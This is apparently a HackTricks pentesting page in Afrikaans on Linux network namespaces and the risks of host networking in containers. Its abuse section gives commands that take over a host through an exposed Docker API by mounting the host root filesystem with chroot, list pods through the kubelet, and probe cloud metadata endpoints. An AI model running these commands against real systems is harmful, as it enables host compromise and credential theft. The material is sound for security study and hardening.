# Netwerk-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-namespace isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, roeteringstabellas, ARP/buurtoestand, firewall-reëls, sockets, en die inhoud van lêers soos `/proc/net`. Dit is waarom 'n container iets kan hê wat soos sy eie `eth0`, sy eie plaaslike roetes, en sy eie loopback-toestel lyk sonder om die gasheer se werklike netwerkstapel te besit.

Wat sekuriteit betref, maak dit saak omdat netwerkisolasie baie meer is as net poortbinding. 'n Privaat netwerk-namespace beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie namespace met die gasheer gedeel word, kan die container skielik sig kry op gasheer-luisteraars, gasheer-lokale dienste, en netwerkbeheerpunte wat nooit bedoel was om aan die toepassing blootgestel te word nie.

## Werking

'n Nuwergeskepte netwerk-namespace begin met 'n leë of byna leë netwerkomgewing totdat interfaces daaraan aangeheg word. Container runtimes skep of verbind dan virtuele interfaces, ken adresse toe, en konfigureer roetes sodat die workload die verwagte konneksie het. In bridge-based deployments beteken dit gewoonlik dat die container 'n veth-backed interface sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod networking.

Hierdie argitektuur verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide privaat netwerkstapel te ontvang, sluit die workload by die gasheer se werklike een aan.

## Lab

Jy kan 'n byna leë netwerk-namespace sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die kontener wat die host-netwerk gebruik het nie meer sy eie geïsoleerde socket- en koppelvlakbeeld nie. Hierdie verandering op sigself is alreeds betekenisvol voordat jy selfs vra watter bevoegdhede die proses het.

## Runtime-gebruik

Docker en Podman skep normaalweg 'n private network namespace vir elke kontener, tensy anders gekonfigureer. Kubernetes gee gewoonlik elke Pod sy eie network namespace, gedeel deur die konteners binne daardie Pod maar afsonderlik van die host. Incus/LXC-stelsels bied ook ryk netwerk-namespace gebaseerde isolasie, dikwels met 'n breër verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat privaat netwerking die standaard isolasiegrens is, terwyl host-netwerking 'n eksplisiete uitskakeling van daardie grens is.

## Miskonfigurasies

Die belangrikste miskonfigurasie is eenvoudigweg om die host se network namespace te deel. Dit word soms gedoen vir prestasie, laevlak-monitering, of gerief, maar dit verwyder een van die skoonste grense wat aan konteners beskikbaar is. Host-lokale luisteraars word op 'n meer direkte wyse bereikbaar, localhost-only services kan toeganklik raak, en bevoegdhede soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die operasies wat hulle moontlik maak nou op die host se eie netwerk-omgewing toegepas word.

## Misbruik

In swak geïsoleerde opstellings kan aanvallers host-luisterdienste inspekteer, bestuur-endpunte bereik wat slegs aan loopback gebind is, verkeer sniff of daarmee inmeng afhangend van die presiese bevoegdhede en omgewing, of roete- en firewall-status herkonfigureer as `CAP_NET_ADMIN` teenwoordig is. In 'n cluster kan dit ook laterale beweging en control-plane verkenning vergemaklik.

Indien jy host-netwerking vermoed, begin deur te bevestig dat die sigbare koppelvlakke en luisteraars aan die host behoort eerder as aan 'n geïsoleerde kontenernetwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only dienste is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Indien network capabilities teenwoordig is, toets of die workload die sigbare stack kan inspekteer of verander:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In cluster- of cloudomgewings, gasheer-netwerk regverdig ook vinnige plaaslike recon van metadata en control-plane-aangrensende dienste:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Volledige Voorbeeld: Host Networking + Local Runtime / Kubelet Toegang

Host networking verskaf nie outomaties host root nie, maar dit stel dikwels dienste bloot wat opsetlik slegs vanaf die node self bereikbaar is. As een van daardie dienste swak beskerm is, word host networking 'n direkte privilege-escalation-pad.

Docker API op localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte host-kompromittering indien 'n plaaslike runtime API blootgestel word sonder behoorlike beskerming
- cluster reconnaissance or lateral movement indien kubelet of lokale agents bereikbaar is
- traffic manipulation or denial of service wanneer dit gekombineer word met `CAP_NET_ADMIN`

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die proses 'n privaat netwerkstapel het, watter roetes en luisteraars sigbaar is, en of die netwerk-aansig reeds host-agtig lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Wat interessant is hier:

- As die namespace-identifiseerder of die sigbare koppelvlakstel soos dié van die gasheer lyk, mag host networking reeds in gebruik wees.
- `ss -lntup` is veral waardevol omdat dit slegs-loopback-luisteraars en plaaslike bestuursendpunte openbaar.
- Roetes, koppelvlakname en firewall-konteks word baie belangriker as `CAP_NET_ADMIN` of `CAP_NET_RAW` aanwesig is.

Wanneer jy 'n container hersien, evalueer altyd die netwerk-namespace saam met die capability set. Gasheer-netwerk tesame met sterk netwerk-capabilities is 'n baie ander houding as brug-netwerk tesame met 'n noue standaard capability set.
